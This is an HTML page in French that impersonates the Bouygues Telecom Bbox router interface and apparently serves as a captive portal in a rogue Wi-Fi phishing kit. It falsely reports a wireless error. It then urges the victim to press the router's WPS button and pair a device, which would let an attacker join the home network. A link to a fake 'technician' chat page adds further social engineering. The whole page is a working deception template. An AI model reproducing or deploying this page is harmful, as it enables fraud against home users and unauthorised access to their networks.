
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur votre interface Bouygues</title>
<link href="/msftconnecttest/bboxcss/centrage.css" rel="stylesheet" type="text/css" />



<IMG class="displayed" src="bbox2.png">

</head>
<body>
<p><font color="teal">Une erreur est survenue sur votre réseau wi-fi, veuillez vous brancher a votre Bbox de Bouygues telecom par cable ethernet et réeinitialiser les connexions sans fil.<b>Gardez cette page ouverte,</b> une fois le cable branché accédez a l'interface d'administration de votre Bbox via le lien suivant:</p>
</br>
<a href="http://192.168.1.254" target="_blank"><u>Interface de gestion.</u></a>
</br>
</br>
<p>Si c'est la première fois que vous voyez cette page, votre Bbox de Bouygues telecom vous demandera d'appuyer sur le bouton wifi pendant 5 secondes de manière a vous authentifier.Une fois cette étape passée, cliquez sur "connecter un appareil en WPS".L'authentification par WPS va réeinitialiser la connexion wifi et vous évite de rentrer la clé de sécurité, au besoin suivez l'aide ci-dessous.</p><p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/msftconnecttest/shout/bboxtchat.php" target="_blank"><u>aide en ligne</u> ...</a>
</br>
</br>
<IMG class="displayed" src="bbox1.png">

</body>
</html>

